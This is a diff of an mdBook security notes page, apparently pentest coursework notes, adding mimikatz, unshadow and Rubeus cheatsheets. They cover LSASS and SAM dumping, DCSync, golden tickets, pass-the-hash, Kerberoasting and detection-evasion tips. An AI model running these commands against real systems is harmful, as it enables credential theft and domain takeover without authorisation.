@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-72e8fce5.js";
+            window.path_to_searchindex_js = "searchindex-45f66119.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-7ea494cf.js"></script>
+        <script src="toc-9a594cb9.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -216,6 +216,10 @@
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
 <li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
 <li><a href="#server-side-template-injection">server-side template injection</a></li>
+<li><a href="#mimikatz-cheatsheet">mimikatz</a></li>
+<li><a href="#unshadow-cheatsheet">unshadow</a></li>
+<li><a href="#rubeus-cheatsheet">rubeus</a></li>
+<li><a href="#ssh-cheatsheet">ssh</a></li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -496,7 +500,7 @@
 <li><a href="#systemd">Systemd</a></li>
 <li><a href="#the-first-60-seconds">The first 60 seconds</a></li>
 <li><a href="#time">time</a></li>
-<li><a href="#troubleshooting">troubleshooting</a></li>
+<li><a href="#troubleshooting-1">troubleshooting</a></li>
 <li><a href="#users-and-user-management">Users and User Management</a></li>
 <li><a href="systems/bash/README.html">Bash</a>
 <ul>
@@ -551,6 +555,9 @@
 <li><a href="#john-the-ripper">john the ripper</a></li>
 <li><a href="#pypykatz">pypykatz</a></li>
 <li><a href="#lazagne">lazagne</a></li>
+<li><a href="#unshadow">unshadow</a></li>
+<li><a href="#rubeus">rubeus</a></li>
+<li><a href="#mimikatz">mimikatz</a></li>
 </ul>
 </li>
 <li><a href="troubleshooting/README.html">Troubleshooting</a>
@@ -582,6 +589,7 @@
 <li><a href="#modifying-machine-code-in-executables">Modify Machine Code</a>
 <ul>
 <li><a href="infosec/README.html">InfoSec</a></li>
+<li><a href="#cracking-protected-files-and-archives">cracking-protected-files</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="#robotstxt">robots.text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
@@ -592,8 +600,6 @@
 <li><a href="#hydra-1">Brute-Forcing</a></li>
 <li><a href="#cve-common-vulnerabilities-and-exposures">CVE</a></li>
 <li><a href="#cvss-common-vulnerability-scoring-system">CVSS</a></li>
-<li><a href="#openvas">openvas</a></li>
-<li><a href="#nessus">nessus</a></li>
 <li><a href="#laudanum">Laudanum</a></li>
 <li><a href="#linux-file-transfer-methods">Linux File Transfer Methods</a></li>
 <li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
@@ -601,6 +607,8 @@
 <li><a href="#attacking-windows-credential-manager">attacking-cred-mgr</a></li>
 <li><a href="#attacking-active-directory">Active Directory Domain Services</a></li>
 <li><a href="#linux-authentication">linux-auth</a></li>
+<li><a href="#pass-the-hash-pth-attacks">Pass The Hash</a></li>
+<li><a href="#pass-the-ticket-ptt-attacks">Pass the Ticket</a></li>
 </ul>
 </li>
 </ul>
@@ -630,31 +638,32 @@
 <li><a href="#hashcat-cheatsheet">hashcat</a></li>
 <li><a href="#standard-http-headers">http_headers</a></li>
 <li><a href="#hydra-cheatsheet">hydra</a></li>
-<li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
+<li><a href="#john-the-ripper-cheatsheet">john</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
+<li><a href="#lazagne-cheatsheet">lazagne</a></li>
 <li><a href="#make-files">make_files</a></li>
 <li><a href="#medusa-cheatsheet">medusa</a></li>
 <li><a href="#metasploit-cheatsheet">metasploit</a></li>
-<li><a href="cheatsheets/mimikatz.html">mimikatz</a></li>
+<li><a href="#mimikatz-cheatsheet">mimikatz</a></li>
+<li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
 <li><a href="#ncat-file-transfer">ncat</a></li>
 <li><a href="#neovim-cheatsheet">neovim</a></li>
 <li><a href="#netcat-file-transfer">netcat</a></li>
 <li><a href="#nikto-cheatsheet">nikto</a></li>
 <li><a href="#nmap-cheatsheet">nmap</a></li>
 <li><a href="#powershell-file-transfer">powershell</a></li>
+<li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#ranger-cheatsheet">ranger</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
 <li><a href="#regex-cheatsheet">regex</a></li>
-<li><a href="#sql-cheat-sheet">sql</a></li>
-<li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
-<li><a href="#multi-line-strings">yaml</a></li>
-<li><a href="#john-the-ripper-cheatsheet">john</a></li>
-<li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
-<li><a href="cheatsheets/ssh.html">ssh</a></li>
-<li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
-<li><a href="#lazagne-cheatsheet">lazagne</a></li>
+<li><a href="#rubeus-cheatsheet">rubeus</a></li>
 <li><a href="#server-side-template-injection">server-side template injection</a></li>
-<li><a href="cheatsheets/unshadow.html">unshadow</a></li>
+<li><a href="#sql-cheat-sheet">sql</a></li>
+<li><a href="#ssh-cheatsheet">ssh</a></li>
+<li><a href="#unshadow-cheatsheet">unshadow</a></li>
+<li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
+<li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
+<li><a href="#multi-line-strings">yaml</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
@@ -3622,6 +3631,807 @@ $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
 {{/with}}
 </code></pre>
 <p>You will first need to encode this payload using URL encoding before sending it to the server. Once encoded, you can include it in a request to the vulnerable web application via a query parameter, form field, or HTTP header, depending on where the SSTI vulnerability exists.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="mimikatz-cheatsheet"><a class="header" href="#mimikatz-cheatsheet">Mimikatz Cheatsheet</a></h1>
+<h2 id="basic-syntax-3"><a class="header" href="#basic-syntax-3">Basic Syntax</a></h2>
+<pre><code class="language-cmd">mimikatz.exe "command1" "command2" "exit"
+</code></pre>
+<p>Always start with:</p>
+<pre><code>privilege::debug
+</code></pre>
+<hr>
+<h2 id="quick-reference-commands-1"><a class="header" href="#quick-reference-commands-1">Quick Reference Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>privilege::debug</code></td><td>Enable debug privileges (required)</td></tr>
+<tr><td><code>sekurlsa::logonpasswords</code></td><td>Dump all credentials from LSASS</td></tr>
+<tr><td><code>sekurlsa::credman</code></td><td>Dump Credential Manager secrets</td></tr>
+<tr><td><code>sekurlsa::tickets /export</code></td><td>Export Kerberos tickets</td></tr>
+<tr><td><code>lsadump::sam</code></td><td>Dump local SAM database</td></tr>
+<tr><td><code>lsadump::secrets</code></td><td>Dump LSA secrets</td></tr>
+<tr><td><code>lsadump::cache</code></td><td>Dump cached domain credentials</td></tr>
+<tr><td><code>lsadump::dcsync /user:Administrator</code></td><td>DCSync attack</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="modules-overview"><a class="header" href="#modules-overview">Modules Overview</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Module</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>sekurlsa</code></td><td>Extract credentials from LSASS memory</td></tr>
+<tr><td><code>lsadump</code></td><td>Dump LSA secrets, SAM, DCSync</td></tr>
+<tr><td><code>kerberos</code></td><td>Kerberos ticket operations</td></tr>
+<tr><td><code>vault</code></td><td>Windows Vault/Credential Manager</td></tr>
+<tr><td><code>dpapi</code></td><td>DPAPI decryption</td></tr>
+<tr><td><code>crypto</code></td><td>Certificate and key operations</td></tr>
+<tr><td><code>token</code></td><td>Token manipulation</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="sekurlsa-module"><a class="header" href="#sekurlsa-module">sekurlsa Module</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>sekurlsa::logonpasswords</code></td><td>Dump all logon passwords</td></tr>
+<tr><td><code>sekurlsa::credman</code></td><td>Dump Credential Manager</td></tr>
+<tr><td><code>sekurlsa::dpapi</code></td><td>Dump DPAPI masterkeys</td></tr>
+<tr><td><code>sekurlsa::tickets</code></td><td>List Kerberos tickets</td></tr>
+<tr><td><code>sekurlsa::tickets /export</code></td><td>Export tickets to .kirbi files</td></tr>
+<tr><td><code>sekurlsa::wdigest</code></td><td>Dump WDigest credentials</td></tr>
+<tr><td><code>sekurlsa::ekeys</code></td><td>Dump Kerberos encryption keys</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass-the-Hash</a></h3>
+<pre><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe
+</code></pre>
+<h3 id="pass-the-hash-with-rc4"><a class="header" href="#pass-the-hash-with-rc4">Pass-the-Hash (with RC4)</a></h3>
+<pre><code>sekurlsa::pth /user:&lt;user&gt; /rc4:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe
+</code></pre>
+<h3 id="pass-the-key--overpass-the-hash-with-aes256"><a class="header" href="#pass-the-key--overpass-the-hash-with-aes256">Pass the Key / OverPass the Hash (with AES256)</a></h3>
+<pre><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;aes256_hash&gt; /run:cmd.exe
+</code></pre>
+<h3 id="extract-kerberos-keys-for-pass-the-key"><a class="header" href="#extract-kerberos-keys-for-pass-the-key">Extract Kerberos Keys (for Pass the Key)</a></h3>
+<pre><code>sekurlsa::ekeys
+</code></pre>
+<hr>
+<h2 id="lsadump-module"><a class="header" href="#lsadump-module">lsadump Module</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>lsadump::sam</code></td><td>Dump SAM database (local accounts)</td></tr>
+<tr><td><code>lsadump::secrets</code></td><td>Dump LSA secrets</td></tr>
+<tr><td><code>lsadump::cache</code></td><td>Dump cached domain creds (DCC2)</td></tr>
+<tr><td><code>lsadump::trust</code></td><td>Dump trust relationships</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="dcsync-attack"><a class="header" href="#dcsync-attack">DCSync Attack</a></h3>
+<pre><code>lsadump::dcsync /domain:domain.local /user:Administrator
+lsadump::dcsync /domain:domain.local /user:krbtgt
+lsadump::dcsync /domain:domain.local /all /csv
+</code></pre>
+<h3 id="offline-sam-dump"><a class="header" href="#offline-sam-dump">Offline SAM Dump</a></h3>
+<pre><code>lsadump::sam /sam:sam.hive /system:system.hive
+</code></pre>
+<h3 id="offline-lsa-secrets"><a class="header" href="#offline-lsa-secrets">Offline LSA Secrets</a></h3>
+<pre><code>lsadump::secrets /system:system.hive /security:security.hive
+</code></pre>
+<hr>
+<h2 id="kerberos-attacks"><a class="header" href="#kerberos-attacks">Kerberos Attacks</a></h2>
+<h3 id="golden-ticket"><a class="header" href="#golden-ticket">Golden Ticket</a></h3>
+<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_sid&gt; /krbtgt:&lt;krbtgt_hash&gt; /ptt
+</code></pre>
+<h3 id="silver-ticket"><a class="header" href="#silver-ticket">Silver Ticket</a></h3>
+<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_sid&gt; /target:&lt;server&gt; /service:&lt;svc&gt; /rc4:&lt;svc_hash&gt; /ptt
+</code></pre>
+<h3 id="ticket-operations"><a class="header" href="#ticket-operations">Ticket Operations</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>kerberos::list</code></td><td>List current tickets</td></tr>
+<tr><td><code>kerberos::ptt &lt;file.kirbi&gt;</code></td><td>Pass-the-Ticket</td></tr>
+<tr><td><code>kerberos::purge</code></td><td>Purge all tickets</td></tr>
+<tr><td><code>kerberos::tgt</code></td><td>Get current TGT</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="dpapi--vault"><a class="header" href="#dpapi--vault">DPAPI &amp; Vault</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>vault::list</code></td><td>List vault credentials</td></tr>
+<tr><td><code>vault::cred</code></td><td>Dump vault credentials</td></tr>
+<tr><td><code>dpapi::cred /in:&lt;file&gt;</code></td><td>Decrypt credential file</td></tr>
+<tr><td><code>dpapi::blob /in:&lt;file&gt; /masterkey:&lt;key&gt;</code></td><td>Decrypt DPAPI blob</td></tr>
+<tr><td><code>dpapi::masterkey /in:&lt;file&gt; /rpc</code></td><td>Get masterkey via RPC</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="one-liners"><a class="header" href="#one-liners">One-Liners</a></h2>
+<h3 id="full-credential-dump"><a class="header" href="#full-credential-dump">Full Credential Dump</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+</code></pre>
+<h3 id="dump-sam"><a class="header" href="#dump-sam">Dump SAM</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
+</code></pre>
+<h3 id="dcsync-krbtgt"><a class="header" href="#dcsync-krbtgt">DCSync krbtgt</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
+</code></pre>
+<h3 id="pass-the-hash-1"><a class="header" href="#pass-the-hash-1">Pass-the-Hash</a></h3>
+<pre><code class="language-cmd">mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+</code></pre>
+<h3 id="export-all-kerberos-tickets"><a class="header" href="#export-all-kerberos-tickets">Export All Kerberos Tickets</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+</code></pre>
+<h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt" "exit"
+</code></pre>
+<hr>
+<h2 id="common-errors"><a class="header" href="#common-errors">Common Errors</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Error</th><th>Solution</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ERROR kuhl_m_sekurlsa_acquireLSA</code></td><td>Run as Administrator</td></tr>
+<tr><td><code>Privilege '20' KO</code></td><td>Need local admin rights</td></tr>
+<tr><td><code>Handle on memory</code></td><td>LSASS protected, try offline dump</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="evasion-tips"><a class="header" href="#evasion-tips">Evasion Tips</a></h2>
+<ul>
+<li>Dump LSASS with <code>procdump -ma lsass.exe lsass.dmp</code> and analyze offline</li>
+<li>Use <code>pypykatz</code> for cross-platform offline analysis</li>
+<li>Use PowerShell <code>Invoke-Mimikatz</code> with AMSI bypass</li>
+<li>Obfuscate or recompile from source</li>
+</ul>
+<hr>
+<h2 id="related-commands"><a class="header" href="#related-commands">Related Commands</a></h2>
+<h3 id="create-lsass-dump-for-offline-analysis"><a class="header" href="#create-lsass-dump-for-offline-analysis">Create LSASS Dump (for offline analysis)</a></h3>
+<pre><code class="language-cmd">procdump.exe -ma lsass.exe lsass.dmp
+</code></pre>
+<h3 id="analyze-with-pypykatz-linux"><a class="header" href="#analyze-with-pypykatz-linux">Analyze with pypykatz (Linux)</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="unshadow-cheatsheet"><a class="header" href="#unshadow-cheatsheet">Unshadow Cheatsheet</a></h1>
+<h2 id="basic-syntax-4"><a class="header" href="#basic-syntax-4">Basic Syntax</a></h2>
+<pre><code>unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
+</code></pre>
+<hr>
+<h2 id="description"><a class="header" href="#description">Description</a></h2>
+<p><code>unshadow</code> is a utility included with John the Ripper that combines <code>/etc/passwd</code> and <code>/etc/shadow</code> files into a single file suitable for password cracking. This is the format that John’s single crack mode was designed for.</p>
+<hr>
+<h2 id="basic-usage-2"><a class="header" href="#basic-usage-2">Basic Usage</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>unshadow passwd shadow &gt; hashes.txt</code></td><td>Combine files for cracking</td></tr>
+<tr><td><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; unshadowed.hashes</code></td><td>Using backup copies</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="workflow"><a class="header" href="#workflow">Workflow</a></h2>
+<h3 id="1-copy-system-files"><a class="header" href="#1-copy-system-files">1. Copy System Files</a></h3>
+<pre><code class="language-sh">sudo cp /etc/passwd /tmp/passwd.bak
+sudo cp /etc/shadow /tmp/shadow.bak
+</code></pre>
+<h3 id="2-combine-with-unshadow"><a class="header" href="#2-combine-with-unshadow">2. Combine with unshadow</a></h3>
+<pre><code class="language-sh">unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
+</code></pre>
+<h3 id="3-crack-with-john-single-mode---recommended"><a class="header" href="#3-crack-with-john-single-mode---recommended">3. Crack with John (Single Mode - Recommended)</a></h3>
+<pre><code class="language-sh">john --single /tmp/unshadowed.hashes
+</code></pre>
+<h3 id="4-crack-with-john-wordlist-mode"><a class="header" href="#4-crack-with-john-wordlist-mode">4. Crack with John (Wordlist Mode)</a></h3>
+<pre><code class="language-sh">john --wordlist=rockyou.txt /tmp/unshadowed.hashes
+</code></pre>
+<h3 id="5-crack-with-hashcat"><a class="header" href="#5-crack-with-hashcat">5. Crack with hashcat</a></h3>
+<pre><code class="language-sh">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt
+</code></pre>
+<hr>
+<h2 id="output-format"><a class="header" href="#output-format">Output Format</a></h2>
+<p>The output combines user info from passwd with the hash from shadow:</p>
+<pre><code>root:$6$xyz...:0:0:root:/root:/bin/bash
+htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
+</code></pre>
+<hr>
+<h2 id="common-hash-modes-hashcat"><a class="header" href="#common-hash-modes-hashcat">Common Hash Modes (hashcat)</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Mode</th><th>Algorithm</th><th>Identifier</th></tr>
+</thead>
+<tbody>
+<tr><td>500</td><td>MD5crypt</td><td>$1$</td></tr>
+<tr><td>1800</td><td>SHA-512crypt</td><td>$6$</td></tr>
+<tr><td>7400</td><td>SHA-256crypt</td><td>$5$</td></tr>
+<tr><td>3200</td><td>bcrypt</td><td>$2a$</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
+<ul>
+<li>John’s <strong>single crack mode</strong> is ideal for unshadowed files as it uses GECOS data (full name, username) to generate candidate passwords</li>
+<li>Always work with copies of system files, not the originals</li>
+<li>The passwd file provides context (username, GECOS) that helps single crack mode</li>
+<li>Requires root access to read <code>/etc/shadow</code></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="rubeus-cheatsheet"><a class="header" href="#rubeus-cheatsheet">Rubeus Cheatsheet</a></h1>
+<h2 id="basic-syntax-5"><a class="header" href="#basic-syntax-5">Basic Syntax</a></h2>
+<pre><code class="language-cmd">Rubeus.exe &lt;command&gt; [options]
+</code></pre>
+<hr>
+<h2 id="quick-reference-commands-2"><a class="header" href="#quick-reference-commands-2">Quick Reference Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>dump</code></td><td>Dump all Kerberos tickets</td></tr>
+<tr><td><code>asktgt</code></td><td>Request a TGT using hash or password</td></tr>
+<tr><td><code>asktgs</code></td><td>Request a TGS for a specific service</td></tr>
+<tr><td><code>ptt</code></td><td>Pass the Ticket (import ticket)</td></tr>
+<tr><td><code>createnetonly</code></td><td>Create sacrificial logon session</td></tr>
+<tr><td><code>renew</code></td><td>Renew a TGT</td></tr>
+<tr><td><code>describe</code></td><td>Describe a ticket</td></tr>
+<tr><td><code>hash</code></td><td>Calculate Kerberos hashes from password</td></tr>
+<tr><td><code>kerberoast</code></td><td>Kerberoast attack</td></tr>
+<tr><td><code>asreproast</code></td><td>AS-REP Roasting attack</td></tr>
+<tr><td><code>s4u</code></td><td>S4U constrained delegation abuse</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="ticket-harvesting"><a class="header" href="#ticket-harvesting">Ticket Harvesting</a></h2>
+<h3 id="dump-all-tickets-base64"><a class="header" href="#dump-all-tickets-base64">Dump All Tickets (Base64)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe dump /nowrap
+</code></pre>
+<h3 id="dump-tickets-for-current-user"><a class="header" href="#dump-tickets-for-current-user">Dump Tickets for Current User</a></h3>
+<pre><code class="language-cmd">Rubeus.exe dump /user:current /nowrap
+</code></pre>
+<h3 id="dump-specific-service-tickets"><a class="header" href="#dump-specific-service-tickets">Dump Specific Service Tickets</a></h3>
+<pre><code class="language-cmd">Rubeus.exe dump /service:krbtgt /nowrap
+</code></pre>
+<h3 id="triage-list-tickets"><a class="header" href="#triage-list-tickets">Triage (List Tickets)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe triage
+</code></pre>
+<hr>
+<h2 id="request-tickets-asktgt"><a class="header" href="#request-tickets-asktgt">Request Tickets (asktgt)</a></h2>
+<h3 id="request-tgt-with-ntlm-hash-rc4"><a class="header" href="#request-tgt-with-ntlm-hash-rc4">Request TGT with NTLM Hash (RC4)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /rc4:&lt;ntlm_hash&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-aes256-hash"><a class="header" href="#request-tgt-with-aes256-hash">Request TGT with AES256 Hash</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;aes256_hash&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-password"><a class="header" href="#request-tgt-with-password">Request TGT with Password</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /password:&lt;password&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-and-import-ptt"><a class="header" href="#request-tgt-and-import-ptt">Request TGT and Import (/ptt)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt
+</code></pre>
+<h3 id="request-tgt-using-domain-controller"><a class="header" href="#request-tgt-using-domain-controller">Request TGT Using Domain Controller</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /rc4:&lt;hash&gt; /dc:&lt;dc_ip&gt; /nowrap
+</code></pre>
+<hr>
+<h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass the Ticket (ptt)</a></h2>
+<h3 id="import-kirbi-file"><a class="header" href="#import-kirbi-file">Import .kirbi File</a></h3>
+<pre><code class="language-cmd">Rubeus.exe ptt /ticket:&lt;path_to_kirbi&gt;
+</code></pre>
+<h3 id="import-base64-ticket"><a class="header" href="#import-base64-ticket">Import Base64 Ticket</a></h3>
+<pre><code class="language-cmd">Rubeus.exe ptt /ticket:&lt;base64_encoded_ticket&gt;
+</code></pre>
+<hr>
+<h2 id="sacrificial-process-createnetonly"><a class="header" href="#sacrificial-process-createnetonly">Sacrificial Process (createnetonly)</a></h2>
+<p>Create a hidden process with a new logon session:</p>
+<pre><code class="language-cmd">Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+</code></pre>
+<p>Then in the new window, request a ticket:</p>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt
+</code></pre>
+<hr>
+<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
+<h3 id="kerberoast-all-users"><a class="header" href="#kerberoast-all-users">Kerberoast All Users</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /nowrap
+</code></pre>
+<h3 id="kerberoast-specific-user"><a class="header" href="#kerberoast-specific-user">Kerberoast Specific User</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /user:&lt;username&gt; /nowrap
+</code></pre>
+<h3 id="kerberoast-with-output-format-for-hashcat"><a class="header" href="#kerberoast-with-output-format-for-hashcat">Kerberoast with Output Format for Hashcat</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /format:hashcat /nowrap
+</code></pre>
+<h3 id="kerberoast-with-aes-encryption"><a class="header" href="#kerberoast-with-aes-encryption">Kerberoast with AES Encryption</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /aes /nowrap
+</code></pre>
+<hr>
+<h2 id="as-rep-roasting"><a class="header" href="#as-rep-roasting">AS-REP Roasting</a></h2>
+<h3 id="as-rep-roast-all-users"><a class="header" href="#as-rep-roast-all-users">AS-REP Roast All Users</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asreproast /nowrap
+</code></pre>
+<h3 id="as-rep-roast-specific-user"><a class="header" href="#as-rep-roast-specific-user">AS-REP Roast Specific User</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asreproast /user:&lt;username&gt; /nowrap
+</code></pre>
+<h3 id="as-rep-roast-with-hashcat-format"><a class="header" href="#as-rep-roast-with-hashcat-format">AS-REP Roast with Hashcat Format</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asreproast /format:hashcat /nowrap
+</code></pre>
+<hr>
+<h2 id="request-service-tickets-asktgs"><a class="header" href="#request-service-tickets-asktgs">Request Service Tickets (asktgs)</a></h2>
+<h3 id="request-tgs-for-service"><a class="header" href="#request-tgs-for-service">Request TGS for Service</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/server.domain.local /nowrap
+</code></pre>
+<h3 id="request-tgs-and-import"><a class="header" href="#request-tgs-and-import">Request TGS and Import</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/server.domain.local /ptt
+</code></pre>
+<hr>
+<h2 id="constrained-delegation-s4u"><a class="header" href="#constrained-delegation-s4u">Constrained Delegation (S4U)</a></h2>
+<h3 id="s4u2self-and-s4u2proxy"><a class="header" href="#s4u2self-and-s4u2proxy">S4U2Self and S4U2Proxy</a></h3>
+<pre><code class="language-cmd">Rubeus.exe s4u /user:&lt;service_account&gt; /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
+</code></pre>
+<h3 id="s4u-with-alternate-service"><a class="header" href="#s4u-with-alternate-service">S4U with Alternate Service</a></h3>
+<pre><code class="language-cmd">Rubeus.exe s4u /user:&lt;service_account&gt; /aes256:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /altservice:ldap /ptt
+</code></pre>
+<hr>
+<h2 id="ticket-operations-1"><a class="header" href="#ticket-operations-1">Ticket Operations</a></h2>
+<h3 id="describe-a-ticket"><a class="header" href="#describe-a-ticket">Describe a Ticket</a></h3>
+<pre><code class="language-cmd">Rubeus.exe describe /ticket:&lt;base64_or_path&gt;
+</code></pre>
+<h3 id="renew-a-tgt"><a class="header" href="#renew-a-tgt">Renew a TGT</a></h3>
+<pre><code class="language-cmd">Rubeus.exe renew /ticket:&lt;base64_or_path&gt; /nowrap
+</code></pre>
+<h3 id="purge-tickets-current-session"><a class="header" href="#purge-tickets-current-session">Purge Tickets (Current Session)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe purge
+</code></pre>
+<h3 id="purge-tickets-specific-luid"><a class="header" href="#purge-tickets-specific-luid">Purge Tickets (Specific LUID)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe purge /luid:&lt;luid&gt;
+</code></pre>
+<hr>
+<h2 id="hash-calculation"><a class="header" href="#hash-calculation">Hash Calculation</a></h2>
+<h3 id="calculate-kerberos-hashes-from-password"><a class="header" href="#calculate-kerberos-hashes-from-password">Calculate Kerberos Hashes from Password</a></h3>
+<pre><code class="language-cmd">Rubeus.exe hash /user:&lt;username&gt; /domain:&lt;domain&gt; /password:&lt;password&gt;
+</code></pre>
+<p>Output includes:</p>
+<ul>
+<li>rc4_hmac (NTLM)</li>
+<li>aes128_cts_hmac_sha1</li>
+<li>aes256_cts_hmac_sha1</li>
+<li>des_cbc_md5</li>
+</ul>
+<hr>
+<h2 id="monitoring"><a class="header" href="#monitoring">Monitoring</a></h2>
+<h3 id="monitor-for-tgts-4624-logon-events"><a class="header" href="#monitor-for-tgts-4624-logon-events">Monitor for TGTs (4624 Logon Events)</a></h3>
